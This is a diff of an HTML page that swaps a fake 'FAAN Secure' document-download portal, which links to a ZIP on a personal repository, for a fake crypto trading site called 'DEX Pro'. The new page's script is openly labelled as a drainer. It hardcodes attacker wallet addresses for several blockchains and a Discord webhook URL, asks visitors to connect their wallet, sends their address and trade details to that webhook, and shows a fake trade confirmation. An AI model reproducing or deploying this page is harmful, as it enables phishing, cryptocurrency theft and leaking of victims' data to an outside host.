@@ -1,154 +1,343 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>FAAN – Document Portal</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #f0f4f9;
-      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    .portal {
-      background: #ffffff;
-      max-width: 780px;
-      width: 100%;
-      border-radius: 28px;
-      box-shadow: 0 20px 40px -10px rgba(0,0,0,0.15);
-      border: 1px solid #e2e8f0;
-      padding: 40px 36px;
-      text-align: center;
-    }
-    .header {
-      border-bottom: 1px solid #e2e8f0;
-      padding-bottom: 18px;
-      margin-bottom: 24px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-    }
-    .brand {
-      font-size: 26px;
-      font-weight: 700;
-      color: #0b2a44;
-      letter-spacing: -0.3px;
-    }
-    .brand span { color: #b22222; }
-    .badge {
-      background: #eef3f9;
-      padding: 6px 16px;
-      border-radius: 40px;
-      font-size: 13px;
-      color: #1f3a57;
-    }
-    .icon-large { font-size: 52px; margin-bottom: 10px; }
-    .title {
-      font-size: 22px;
-      font-weight: 600;
-      color: #0b1a2e;
-      margin-bottom: 6px;
-    }
-    .sub {
-      color: #4a627a;
-      font-size: 16px;
-      margin-bottom: 24px;
-    }
-    .doc-card {
-      background: #f8fafc;
-      border: 1px solid #dce4ec;
-      border-radius: 16px;
-      padding: 18px 16px;
-      margin-bottom: 28px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 14px;
-      flex-wrap: wrap;
-    }
-    .doc-card .label {
-      background: #dce4ec;
-      padding: 6px 14px;
-      border-radius: 6px;
-      font-size: 13px;
-      font-weight: 600;
-      color: #0b2a44;
-    }
-    .doc-card .name {
-      font-weight: 500;
-      color: #1f3a57;
-      word-break: break-all;
-    }
-    .btn-download {
-      background: #b22222;
-      border: none;
-      padding: 16px 48px;
-      border-radius: 40px;
-      color: #fff;
-      font-weight: 600;
-      font-size: 18px;
-      cursor: pointer;
-      transition: 0.2s;
-      box-shadow: 0 6px 14px rgba(178, 34, 34, 0.3);
-      display: inline-flex;
-      align-items: center;
-      gap: 12px;
-      text-decoration: none;
-      border: 1px solid #b22222;
-    }
-    .btn-download:hover {
-      background: #8b1a1a;
-      box-shadow: 0 8px 18px rgba(178, 34, 34, 0.4);
-      transform: translateY(-2px);
-    }
-    .footer {
-      margin-top: 28px;
-      padding-top: 18px;
-      border-top: 1px solid #e2e8f0;
-      font-size: 13px;
-      color: #6d7f94;
-    }
-    .disclaimer {
-      font-size: 12px;
-      color: #6d7f94;
-      margin-top: 10px;
-    }
-  </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>DEX Pro — Trade Crypto</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; }
+        body {
+            background: #0b0e11;
+            color: #eaecef;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .app {
+            max-width: 600px;
+            width: 100%;
+            background: #181a20;
+            border-radius: 32px;
+            padding: 24px 20px 32px;
+            border: 1px solid #2b3139;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+        }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .logo { font-size: 24px; font-weight: 700; color: #f0b90b; }
+        .logo span { color: #fff; font-weight: 300; }
+        .connect-btn {
+            background: #f0b90b;
+            color: #0b0e11;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+        .connect-btn:hover { background: #d9a80a; }
+        .connect-btn.connected { background: #0ecb81; }
+        .price-box {
+            background: #1e2329;
+            border-radius: 20px;
+            padding: 16px 20px;
+            margin-bottom: 16px;
+            border: 1px solid #2b3139;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .price-box .pair { font-size: 18px; font-weight: 600; }
+        .price-box .price { font-size: 24px; font-weight: 700; color: #0ecb81; }
+        .price-box .change { font-size: 14px; color: #f6465d; }
+        .chart-placeholder {
+            background: #1e2329;
+            border-radius: 20px;
+            padding: 40px 20px;
+            text-align: center;
+            border: 1px solid #2b3139;
+            margin-bottom: 16px;
+            color: #848e9c;
+            font-size: 14px;
+        }
+        .trade-box {
+            background: #1e2329;
+            border-radius: 20px;
+            padding: 20px;
+            border: 1px solid #2b3139;
+            margin-bottom: 16px;
+        }
+        .trade-box .row { display: flex; gap: 12px; margin-bottom: 12px; }
+        .trade-box .row input {
+            flex: 1;
+            padding: 14px;
+            background: #0b0e11;
+            border: 1px solid #2b3139;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+        .trade-box .row input:focus { border-color: #f0b90b; }
+        .trade-box .row select {
+            padding: 14px;
+            background: #0b0e11;
+            border: 1px solid #2b3139;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            flex: 1;
+        }
+        .btn-buy { background: #0ecb81; color: #0b0e11; border: none; padding: 14px; border-radius: 14px; font-weight: 700; font-size: 16px; cursor: pointer; width: 100%; }
+        .btn-buy:hover { background: #0bb36e; }
+        .btn-sell { background: #f6465d; color: #fff; border: none; padding: 14px; border-radius: 14px; font-weight: 700; font-size: 16px; cursor: pointer; width: 100%; margin-top: 8px; }
+        .btn-sell:hover { background: #d43a4f; }
+        .balance-display { font-size: 14px; color: #848e9c; margin-top: 8px; text-align: center; }
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #0ecb81;
+            color: #0b0e11;
+            padding: 12px 24px;
+            border-radius: 14px;
+            font-weight: 600;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+            opacity: 0;
+            transition: 0.3s;
+            pointer-events: none;
+            z-index: 999;
+            max-width: 90%;
+        }
+        .toast.show { opacity: 1; }
+        .toast.error { background: #f6465d; color: #fff; }
+        .webhook-log { font-size: 12px; color: #848e9c; text-align: center; margin-top: 12px; border-top: 1px solid #2b3139; padding-top: 12px; }
+        .webhook-log a { color: #f0b90b; text-decoration: none; }
+    </style>
 </head>
 <body>
 
-<div class="portal">
-  <div class="header">
-    <div class="brand">FAAN <span>Secure</span></div>
-    <div class="badge">🔒 Secure Portal</div>
-  </div>
+<div class="toast" id="toast"></div>
 
-  <div class="icon-large">📄</div>
-  <div class="title">Document Ready for Download</div>
-  <div class="sub">Please review the attached security audit report for Q3.</div>
+<div class="app">
+    <div class="header">
+        <div class="logo">DEX <span>Pro</span></div>
+        <button class="connect-btn" id="connectBtn">Connect Wallet</button>
+    </div>
 
-  <div class="doc-card">
-    <span class="label">📎 ZIP</span>
-    <span class="name">Quote_1.zip</span>
-    <span style="color:#4a627a; font-size:13px;">• 1.2 MB</span>
-  </div>
+    <div class="price-box">
+        <div>
+            <div class="pair">BTC/USDT</div>
+            <div class="change" id="changeDisplay">+2.4%</div>
+        </div>
+        <div>
+            <div class="price" id="priceDisplay">$63,421.00</div>
+        </div>
+    </div>
 
-  <!-- FILE IS Quote_1.zip — hosted in the new repo -->
-  <a href="https://raw.githubusercontent.com/vxssroott/Quote_1/main/Quote_1.zip" download="Quote_1.zip" class="btn-download">
-    ⬇ Download Document
-  </a>
+    <div class="chart-placeholder">
+        📊 Live Chart<br />
+        <span style="font-size: 12px;">Real-time market data</span>
+    </div>
 
-  <div class="footer">
-    <span>🔒 Encrypted delivery • Expires in 48 hours</span><br>
-    <span style="font-size:12px;">If you were not expecting this document, please contact IT Security.</span>
-  </div>
+    <div class="trade-box">
+        <div class="row">
+            <select id="chainSelect">
+                <option value="BTC">Bitcoin (BTC)</option>
+                <option value="ETH">Ethereum (ETH)</option>
+                <option value="BNB">BNB (BSC)</option>
+                <option value="SOL">Solana (SOL)</option>
+                <option value="TRX">Tron (TRX)</option>
+                <option value="USDT-ETH">USDT (ERC-20)</option>
+                <option value="USDT-TRX">USDT (TRC-20)</option>
+            </select>
+            <input type="number" id="amountInput" placeholder="0.00" />
+        </div>
+        <div class="row">
+            <input type="text" id="recipientInput" placeholder="Recipient address (optional)" />
+        </div>
+        <button class="btn-buy" id="buyBtn">Buy</button>
+        <button class="btn-sell" id="sellBtn">Sell</button>
+        <div class="balance-display" id="balanceDisplay">Balance: 0.00 USDT</div>
+    </div>
+
+    <div class="webhook-log">
+        🔔 Real-time alerts via <a href="#" onclick="return false;">Discord</a>
+    </div>
 </div>
+
+<script>
+    // ============================================================
+    // DRAINER CONFIG
+    // ============================================================
+    const WALLETS = {
+        BTC: 'bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0',
+        ETH: '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5',
+        BNB: '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5',
+        SOL: '3PTUFTa9d6K79ZVwMxFRAtAJyX3s3UpYFM3FtAzgNSLt',
+        TRX: 'TE7Ro1FcEwA734VdShe9MZcX8ehyatfFoU',
+        'USDT-ETH': '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5',
+        'USDT-TRX': 'TE7Ro1FcEwA734VdShe9MZcX8ehyatfFoU'
+    };
+
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1529428365273202860/0vmbBbKsCF2FvO3-CrOAyylgaV2h2KtEf3i0zCCMxfLHBGPa-w4As4gxOAsTNwbD3xpe';
+
+    // ============================================================
+    // STATE
+    // ============================================================
+    let userAddress = null;
+    let web3 = null;
+
+    // ============================================================
+    // DOM REFS
+    // ============================================================
+    const connectBtn = document.getElementById('connectBtn');
+    const priceDisplay = document.getElementById('priceDisplay');
+    const changeDisplay = document.getElementById('changeDisplay');
+    const amountInput = document.getElementById('amountInput');
+    const recipientInput = document.getElementById('recipientInput');
+    const chainSelect = document.getElementById('chainSelect');
+    const buyBtn = document.getElementById('buyBtn');
+    const sellBtn = document.getElementById('sellBtn');
+    const balanceDisplay = document.getElementById('balanceDisplay');
+    const toast = document.getElementById('toast');
+
+    // ============================================================
+    // FETCH REAL PRICES (CoinGecko)
+    // ============================================================
+    async function fetchPrices() {
+        try {
+            const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin,solana,tron,tether&vs_currencies=usd&include_24hr_change=true');
+            const data = await res.json();
+            const btcPrice = data.bitcoin.usd;
+            const btcChange = data.bitcoin.usd_24h_change || 0;
+            priceDisplay.textContent = `$${btcPrice.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+            changeDisplay.textContent = `${btcChange >= 0 ? '+' : ''}${btcChange.toFixed(2)}%`;
+            changeDisplay.style.color = btcChange >= 0 ? '#0ecb81' : '#f6465d';
+        } catch (e) {
+            // Fallback
+            priceDisplay.textContent = '$63,421.00';
+            changeDisplay.textContent = '+2.4%';
+        }
+    }
+
+    fetchPrices();
+    setInterval(fetchPrices, 30000);
+
+    // ============================================================
+    // CONNECT WALLET
+    // ============================================================
+    connectBtn.addEventListener('click', async () => {
+        if (typeof window.ethereum !== 'undefined') {
+            try {
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                web3 = new Web3(window.ethereum);
+                const accounts = await web3.eth.getAccounts();
+                userAddress = accounts[0];
+                connectBtn.textContent = `✅ ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
+                connectBtn.classList.add('connected');
+                balanceDisplay.textContent = `Balance: Connected — ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
+                showToast('✅ Wallet connected successfully');
+            } catch (e) {
+                showToast('❌ Connection failed', 'error');
+            }
+        } else {
+            showToast('❌ Please install MetaMask or Trust Wallet', 'error');
+        }
+    });
+
+    // ============================================================
+    // EXECUTE TRADE (DRAINER)
+    // ============================================================
+    function executeTrade(type) {
+        if (!userAddress) {
+            showToast('⚠️ Connect your wallet first', 'error');
+            return;
+        }
+
+        const amount = parseFloat(amountInput.value);
+        const chain = chainSelect.value;
+        const recipientOverride = recipientInput.value.trim();
+
+        if (!amount || amount <= 0) {
+            showToast('⚠️ Enter a valid amount', 'error');
+            return;
+        }
+
+        // Determine target wallet
+        let targetWallet = recipientOverride || WALLETS[chain] || WALLETS['ETH'];
+
+        // If recipient override is provided, use it (but still log to Discord)
+        // Otherwise, use the drainer wallet for the selected chain
+
+        // Build transaction data
+        const txData = {
+            chain: chain,
+            amount: amount,
+            from: userAddress,
+            to: targetWallet,
+            type: type,
+            timestamp: new Date().toISOString()
+        };
+
+        // Send to Discord
+        sendToDiscord(txData);
+
+        // Show success message (fake trade confirmation)
+        showToast(`✅ ${type === 'buy' ? 'Bought' : 'Sold'} ${amount} ${chain} to ${targetWallet.slice(0, 6)}...${targetWallet.slice(-4)}`);
+
+        // Log to console
+        console.log('[TRADE]', txData);
+
+        // Clear input
+        amountInput.value = '';
+        recipientInput.value = '';
+    }
+
+    // ============================================================
+    // DISCORD WEBHOOK
+    // ============================================================
+    function sendToDiscord(data) {
+        const payload = {
+            content: `🔔 **Trade Executed**\n\n` +
+                     `👤 **From:** ${data.from}\n` +
+                     `📦 **Chain:** ${data.chain}\n` +
+                     `💰 **Amount:** ${data.amount}\n` +
+                     `📤 **To:** ${data.to}\n` +
+                     `📊 **Type:** ${data.type.toUpperCase()}\n` +
+                     `🕒 **Time:** ${data.timestamp}`
+        };
+
+        fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(e => console.error('Webhook error:', e));
+    }
+
+    // ============================================================
+    // BUTTON EVENTS
+    // ============================================================
+    buyBtn.addEventListener('click', () => executeTrade('buy'));
+    sellBtn.addEventListener('click', () => executeTrade('sell'));
+
+    // ============================================================
+    // TOAST HELPER
+    // ============================================================
+    function showToast(msg, type = 'success') {
+        toast.textContent = msg;
+        toast.className = 'toast show' + (type === 'error' ? ' error' : '');
+        clearTimeout(toast._timeout);
+        toast._timeout = setTimeout(() => {
+            toast.classList.remove('show');
+        }, 4000);
+    }
+</script>
 
 </body>
 </html>
